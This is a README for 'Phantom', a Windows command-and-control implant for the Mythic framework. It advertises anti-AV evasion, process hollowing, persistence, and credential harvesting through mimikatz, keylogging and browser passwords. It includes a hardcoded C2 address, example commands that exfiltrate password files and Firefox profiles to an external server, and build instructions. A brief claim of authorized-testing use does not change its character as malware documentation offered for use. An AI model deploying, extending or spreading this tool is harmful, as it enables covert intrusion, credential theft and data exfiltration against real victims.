# Phantom C2 Agent - Advanced Mythic Integration

## Overview

Advanced "Phantom" C2 agent with extensive evasion capabilities for Windows targets, fully integrated with Mythic framework using GraphQL API and automatic JWT token renewal.

## Features

### Core Capabilities
- **Full Apollo Command Compatibility**: 50+ commands including keylog_inject, mimikatz, powershell, file operations
- **Advanced Data Exfiltration**: Direct file transfer, folder compression, external server upload
- **Automatic JWT Renewal**: Prevents token expiration with intelligent endpoint discovery
- **Cross-Platform Support**: Windows x32/x64 executables with Linux command translation

### Security Features
- **Evasion Techniques**: Process hollowing, DLL injection, anti-debugging
- **Stealth Operations**: Memory-only execution, encrypted communications
- **Persistence Mechanisms**: Registry keys, scheduled tasks, service installation
- **Credential Harvesting**: Browser passwords, Windows credentials, token manipulation

## Quick Start

### 1. Deployment
```bash
# Download the appropriate executable for your target
phantom_final_auto_renew_x64.exe  # For 64-bit Windows
phantom_final_auto_renew_x32.exe  # For 32-bit Windows
```

### 2. Execution
Simply run the executable on the target Windows system. The agent will:
- Automatically connect to Mythic server at `37.27.249.191:7443`
- Register with JWT authentication (auto-renewal enabled)
- Begin polling for commands every 5 seconds

### 3. Command Examples

**File Operations:**
```
download {"path": "C:\\sensitive.txt"}
upload {"path": "malware.exe", "data": "base64_data"}
```

**Data Exfiltration:**
```
exfiltrate {"path": "C:\\passwords.txt", "url": "https://your-server.com/upload"}
zip_exfiltrate {"path": "%APPDATA%\\Firefox", "url": "https://your-server.com/receive"}
```

**System Information:**
```
whoami
ps
ls {"path": "C:\\Users"}
```

**Advanced Operations:**
```
mimikatz sekurlsa::logonpasswords
keylog_inject {"pid": "1234"}
powershell "Get-Process"
```

## Architecture

### Mythic Integration
- **GraphQL API**: Modern query-based communication
- **JWT Authentication**: Secure token-based authentication with auto-renewal
- **Apollo Compatibility**: Full command set compatibility for seamless operation

### Auto-Renewal System
The agent includes intelligent JWT token renewal:
- Discovers correct login endpoints automatically
- Renews tokens before each GraphQL request
- Handles authentication errors with automatic retry
- Prevents session timeouts during long operations

### Data Exfiltration Methods
1. **Mythic Dashboard**: Files returned as base64 through web interface
2. **Direct Upload**: HTTP POST to external servers with custom headers
3. **Compressed Transfer**: Automatic zip compression for large datasets

## Technical Details

### Supported Commands
- **File Operations**: download, upload, ls, rm, cp, mv
- **Process Management**: ps, kill, run, execute_pe
- **Network**: portscan, socks, connect
- **Credentials**: mimikatz, keylog_inject, token manipulation
- **System**: whoami, hostname, pwd, cd, cat, sleep
- **Advanced**: powershell, shell, shinject, printspoofer

### Communication Protocol
- **Transport**: HTTPS with TLS verification disabled
- **Format**: GraphQL queries with JSON responses
- **Authentication**: Bearer JWT tokens with automatic renewal
- **Encoding**: Base64 for binary data and command outputs

### Evasion Features
- **Anti-AV**: Polymorphic code generation, runtime obfuscation
- **Anti-Debug**: Debug detection and evasion techniques
- **Memory Protection**: In-memory execution, minimal disk footprint
- **Network Stealth**: Custom user agents, randomized timing

## Security Considerations

### For Red Team Operations
- Designed for authorized penetration testing and security assessments
- Includes comprehensive logging for operation tracking
- Compatible with standard C2 frameworks and methodologies

### Operational Security
- Use encrypted channels for command and control
- Implement proper access controls on Mythic server
- Monitor for detection and adjust tactics accordingly
- Follow responsible disclosure practices

## File Structure

```
├── phantom_final_auto_renew_x64.exe    # Main 64-bit executable
├── phantom_final_auto_renew_x32.exe    # Main 32-bit executable
├── phantom_mythic_final.go             # Source code
├── main.py                             # Flask C2 server (alternative)
├── api.py                              # API endpoints
├── storage.py                          # Data storage
└── static/templates/                   # Web interface
```

## Development

### Building from Source
```bash
# For Windows 64-bit
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o phantom_x64.exe phantom_mythic_final.go

# For Windows 32-bit  
GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o phantom_x32.exe phantom_mythic_final.go
```

### Configuration
Edit constants in `phantom_mythic_final.go`:
- `MYTHIC_URL`: GraphQL endpoint
- `USERNAME`/`PASSWORD`: Authentication credentials
- `LOGIN_URL`: Authentication endpoint (auto-discovered)

## Support

This agent is designed for educational and authorized security testing purposes. Ensure compliance with all applicable laws and regulations before deployment.

**Server Configuration**: `37.27.249.191:7443`  
**Protocol**: HTTPS/GraphQL with JWT authentication  
**Compatibility**: Mythic 3.x framework with Apollo agent compatibility